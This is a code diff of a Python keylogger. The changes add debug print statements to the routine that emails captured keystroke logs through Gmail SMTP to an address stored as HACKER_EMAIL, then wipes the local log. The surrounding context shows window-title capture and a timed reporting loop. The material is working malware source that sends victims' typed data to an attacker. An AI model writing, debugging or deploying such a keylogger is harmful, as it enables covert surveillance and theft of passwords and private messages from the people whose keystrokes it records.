@@ -30,12 +30,14 @@ def get_active_window_title() -> str:
 
 def send_log_via_email():
     if not os.path.exists(LOG_FILE):
+        print("[DEBUG] Missing log file.")
         return
         
     with open(LOG_FILE, "r", encoding="utf-8") as f:
         log_data = f.read()
         
     if not log_data.strip():
+        print("[DEBUG] Log file is empty. Skipping email.")
         return
 
     msg = EmailMessage()
@@ -45,22 +47,26 @@ def send_log_via_email():
     msg['To'] = HACKER_EMAIL
 
     try:
+        print(f"[DEBUG] Connecting to SMTP with: {SMTP_EMAIL}...")
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(SMTP_EMAIL, SMTP_PASSWORD)
         server.send_message(msg)
         server.quit()
+        print("[DEBUG] Email sent SUCCESSFULLY!")
         
         with open(LOG_FILE, "w", encoding="utf-8") as f:
             f.write("")
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"[ERROR] SMTP Failed: {e}")
 
 def report_loop():
     while True:
         time.sleep(REPORT_INTERVAL)
         if SMTP_EMAIL and SMTP_PASSWORD:
             send_log_via_email()
+        else:
+            print("[DEBUG] SMTP credentials missing in .env")
 
 def start_keylogger() -> None:
     current_window = ""
